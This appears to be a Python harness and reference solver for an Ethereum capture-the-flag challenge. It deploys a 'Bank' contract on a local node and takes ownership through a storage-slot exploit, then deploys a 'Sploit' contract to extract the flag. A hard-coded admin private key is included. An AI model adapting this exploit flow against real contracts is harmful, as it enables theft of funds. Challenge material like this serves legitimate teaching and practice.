#!/usr/bin/env python3
import json, os, time, requests
from web3 import Web3
from subprocess import check_output, PIPE
from compiler import compile_script

acc = '0x544e3941EF92D6b2Da1335AFB8B203B1706bdEa9'

admin = '0x03f46475C4b79986Cb9E618Ec7F79C2f326CBEC0'
admin_privkey = '0xa728299cbb9cd5a107ef19919e4648e4db88fade63eaea9cb32ffc1c9b17d44c'

ROOT = os.path.dirname(os.path.abspath(__file__))

flag = open(ROOT + '/flag.txt', 'rb').read().strip()
assert 32 < len(flag) < 64
flag = int.from_bytes(flag, byteorder='big')
flag1 = flag // 2**256
flag2 = flag % 2**256

def solc(fname, contract):
    out = check_output(['solc', '--combined-json',
                        'abi,bin', fname], stderr=PIPE)
    return json.loads(out)['contracts'][contract]

bank_source = ROOT + '/Bank.sol'
bank_output = solc(bank_source, bank_source + ':Bank')

sploit_source = ROOT + '/Sploit.sol'
sploit_output = solc(sploit_source, sploit_source + ':Sploit')

class Connection():
    def __init__(self, url='http://127.0.0.1:8545'):
        self.w3 = Web3(Web3.HTTPProvider(url))
        self.Bank = self.w3.eth.contract(
            abi=bank_output['abi'],
            bytecode=bank_output['bin'])

    def wait(self, timeout=30, interval=1):
        t0 = time.time()
        while True:
            time.sleep(interval)
            try:
                self.w3.eth.getBalance(acc)
                return
            except requests.exceptions.ConnectionError:
                pass
            if time.time() - t0 > timeout:
                raise TimeoutError

    def send_as_admin(self, tx):
        tx.update({
            'nonce': self.w3.eth.getTransactionCount(admin),
            'from': admin,
            'gas': 2000000,
            })
        signed = self.w3.eth.account.signTransaction(tx, admin_privkey)
        tx_hash = self.w3.eth.sendRawTransaction(signed.rawTransaction)
        return self.w3.eth.waitForTransactionReceipt(tx_hash)

    def prepare(self):
        tx = {
            'from': acc,
            'to': admin,
            'value': 1*10**18,
            'gas': 2000000,
            'gasPrice': 40000,
        }
        self.w3.personal.sendTransaction(tx, passphrase='')

        tx = self.Bank.constructor().buildTransaction({'from': admin})
        tx_receipt = self.send_as_admin(tx)

        self.Bank = self.w3.eth.contract(
            abi=self.Bank.abi,
            address=tx_receipt.contractAddress)

        assert self.Bank.functions.isOwner(admin).call()

        self.filter = self.Bank.events.FlagRequested.createFilter(fromBlock=0)

    def get_bank_addr(self):
        return self.Bank.address

    def run_tx(self, addr):
        try:
            tx = self.Bank.functions.runTx(addr).buildTransaction({'from': admin})
            self.send_as_admin(tx)
            return True
        except ValueError:
            return False


    def run_code(self, evmcode):
        tx_receipt = self.send_as_admin({
            'from': admin,
            'gas': 2000000,
            'gasPrice': 40000,
            'data': evmcode,
        })
        payload_addr = tx_receipt.contractAddress
        # print('Exploit code deployed at %s' % payload_addr)
        return self.run_tx(payload_addr)

    def check(self):
        if len(self.filter.get_new_entries()) > 0:
            # print('Sending flag')
            tx = self.Bank.functions.setFlag(flag1, flag2).buildTransaction(
                        {'from': admin})
            self.send_as_admin(tx)
            return True

    def exploit(self):
        assert not self.Bank.functions.isOwner(acc).call()

        addr = Web3.soliditySha3(['uint256', 'uint256'], [int(acc, 16), 0])
        addr = int.from_bytes(addr, byteorder='big')
        with open(ROOT + '/sploit.txt') as f:
            code = f.read().replace('ADDR_HERE', str(addr))
        data = compile_script(code)

        tx = {
            'from': acc,
            'gas': 2000000,
            'gasPrice': 40000,
            'data': data,
        }
        tx_hash = self.w3.personal.sendTransaction(tx, passphrase='')
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash)

        exploit_addr = tx_receipt.contractAddress
        self.run_tx(exploit_addr)

        assert self.Bank.functions.isOwner(acc).call()

        Sploit = self.w3.eth.contract(
            abi=sploit_output['abi'],
            bytecode=sploit_output['bin'])
        tx_hash = Sploit.constructor().transact({
            'from': acc, 'gas': 2000000})
        tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash)

        Sploit = self.w3.eth.contract(
            abi=Sploit.abi, address=tx_receipt.contractAddress)

        self.Bank.functions.runTx(Sploit.address).transact({
            'from': acc, 'gas': 2000000})

        self.check()
        flag1 = self.w3.eth.getStorageAt(self.Bank.address, 100)
        flag2 = self.w3.eth.getStorageAt(self.Bank.address, 101)
        print(flag1 + flag2)

if __name__ == '__main__':
    c = Connection('http://127.0.0.1:9000/eth/a')
    c.prepare()
    print('Bank address: %s' % c.get_bank_addr())
    c.exploit()
